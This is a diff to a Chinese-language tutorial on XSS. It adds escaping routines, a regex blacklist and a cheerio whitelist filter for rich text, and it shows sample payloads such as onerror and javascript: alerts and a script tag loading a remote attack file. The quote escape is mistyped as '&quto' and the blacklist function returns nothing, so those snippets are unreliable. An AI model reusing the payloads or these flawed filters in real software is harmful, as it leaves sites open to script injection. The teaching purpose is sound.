@@ -23,7 +23,13 @@
 
 甚至，攻击者嵌入自己的脚本，<script src="http://my.attack.js"></script>
 
-防御：可以对用户输入进行转义，替换尖括号即可完成转义，将<和>转换成&lt;，&gt;
+#### HTML节点内容防御方案
+可以对用户输入进行转义，替换尖括号即可完成转义，将<和>转换成&lt;，&gt;
+
+`keyword.replace(/</g, '&lt;')`
+
+`keyword.replace(/>/g, '&gt;')`
+
 
 
 ### HTML属性
@@ -33,6 +39,14 @@ imgUrl来自用户输入，攻击者通过巧妙构造imgUrl=1" onerror="alert(1
 <img src="1" onerror="alert(1)" />
 ```
 http://localhost:3001/?imgUrl=1" onerror="alert(1)
+
+#### HTML属性防御方案
+转义引号(")为html实体(&quto;)，单引号(')转成html实体(&#39;)，空格转成html实体(&#32;)
+
+`keyword.replace(/"/g, '&quto')`
+`keyword.replace(/'/g, '&#39;')`
+`keyword.replace(/ /g, '&#32;')`
+
 
 
 ### JavaScript代码注入
@@ -46,10 +60,77 @@ http://localhost:3001/?imgUrl=1" onerror="alert(1)
 http://localhost:3001/?data=hello";alert(1)"
 
 
+#### JavaScript代码注入防御方案
+转义双引号变成(\")或者转换成json
+`keyword.replace(/\\/g, '\\\\')`
+`keyword.replace(/"/g, '\\"')`
+
+或者转成JSON字符串
+`JSON.stringify(keyword)`
+
+
+
+
 ### 富文本
+富文本既要保留原有的格式又要防止xss，因此只能针对特定的属性进行过滤，有两种思路：
+- 按照黑名单(比如发现包含有<script> 或者onerror等属性就过滤到这个单词)，这种方式相对简单，但是html属性多种多样，很容易遗漏个别属性
+- 按照白名单(比如只保留部分标签和属性)的方式做过滤，这种方式防御能力比较彻底，实现方式相对繁琐。需要将html完全解析成抽象语法树然后进行过滤
 
+#### 富文本攻击方式
+```html
+<font color="red">这是红色字</font><br/><script>document.write("xss")</script>
+```
 
+```html
+<a href="javascript:alert(1)">hello</a>
+```
 
+```html
+<img src="abc" onerror="alert(1)" />
+```
+
+#### 富文本攻击防御方案
+##### 黑名单方式
+```html
+var xssFilter = function(html){
+  html = html.replace(/<\s*\/?script\s*>/g, '')
+  html = html.replace(/javascript:[^'"]*/g, '')
+  html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/g, '')
+}
+```
+##### 白名单方式
+保留部分标签和属性
+```javascript
+// html为要处理的富文本字符串
+var xssFilter = function(html){
+  if(!html) return '';
+  var cheerio = require('cheerio') // 借助cheerio这个库
+  var $ = cheerio.load(html)
+  // 白名单
+  var whiteList = {
+    'img': ['src'],
+    'font': ['color', 'size'],
+    'a': ['href']
+  }
+  $('*').each(function(index, elem){
+    if(!whiteList[elem.name]){
+      $(elem).remove();
+      return;
+    }
+    
+    for(var attr in elem.attribs){
+      if(whiteList[elem.name].indexOf(attr) === -1){
+        $(elem).attr(attr, null)
+      }
+    }
+    
+    
+  })
+  
+  return $.html()
+}
+
+```
 
 ### XSS防御方案
 
@@ -72,35 +153,7 @@ http://localhost:3001/?data=hello";alert(1)"
         + a标签：<a href="javascript:alert(3)">你好</a>，这种就替换掉javascript:关键字
         + <img src="abc" onerror="alert(1)">，这种就替换onerror
         + 使用白名单的方式进行过滤
-```javascript
-// html为要处理的富文本字符串
-var xssFilter = function(html){
-  if(!html) return '';
-  var cheerio = require('cheerio') // 借助cheerio这个库
-  var $ = cheerio.load(html)
-  // 白名单
-  var whiteList = {
-    'img': ['src'],
-  }
-  $('*').each(function(index, elem){
-    if(!whiteList[elem.name]){
-      $(elem).remove();
-      return;
-    }
-    
-    for(var attr in elem.attribs){
-      if(whiteList[elem.name].indexOf(attr) === -1){
-        $(elem).attr(attr, null)
-      }
-    }
-    
-    
-  })
-  
-  return $.html()
-}
 
-```
    
 - 跨站请求伪造攻击 CSRF
 - 前端Cookies安全性
